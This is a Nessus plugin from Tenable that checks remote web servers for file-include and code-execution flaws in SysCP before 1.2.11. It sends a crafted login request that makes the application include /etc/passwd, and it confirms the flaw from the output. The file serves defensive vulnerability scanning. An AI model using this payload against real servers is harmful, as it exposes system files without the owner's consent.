#
# (C) Tenable Network Security
#

include("compat.inc");

if (description) {
  script_id(19417);
  script_version("$Revision: 1.15 $");
  script_cve_id("CVE-2005-2568", "CVE-2005-2567");
  script_bugtraq_id(14490);
  script_osvdb_id(18565, 18566);

  script_name(english:"SysCP < 1.2.11 Multiple Script Command Execution Vulnerabilities");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by remote
code execution vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote host is running SysCP, an open source control panel written
in PHP. 

The version of SysCP installed on the remote host uses user-supplied
input to several variables in various scripts without sanitizing it. 
Provided PHP's 'register_globals' setting is enabled, an attacker can
exploit these flaws to pass arbitrary PHP code to the application's
internal template engine for execution or to affect the application's
use of include files." );
 script_set_attribute(attribute:"see_also", value:"http://www.hardened-php.net/advisory_132005.64.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to SysCP version 1.2.11 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/08/10");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/08/04");
 script_cvs_date("$Date: 2013/01/22 23:13:44 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value:"cpe:/a:syscp_team:syscp");
script_end_attributes();

 
  script_summary(english:"Checks for multiple script execution vulnerabilities in SysCP < 1.2.11");
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2013 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Loop through CGI directories.
foreach dir (cgi_dirs()) {
  # Try to exploit the file include flaw.
  w = http_send_recv3(method:"GET",
    item:string(
      dir, "/index.php?",
      "action=login&",
      "languages[Nessus]=", SCRIPT_NAME, "&",
      "language=Nessus&",
      "langs[Nessus][0][file]=/etc/passwd"
    ), 
    port:port
  );
  if (isnull(w)) exit(1, "The web server on port "+port+" did not answer");
  res = w[2];

  # There's a problem if we get the password file.
  if (egrep(string:res, pattern:"root:.*:0:[01]:")) {
    security_hole(port);
    exit(0);
  }
}
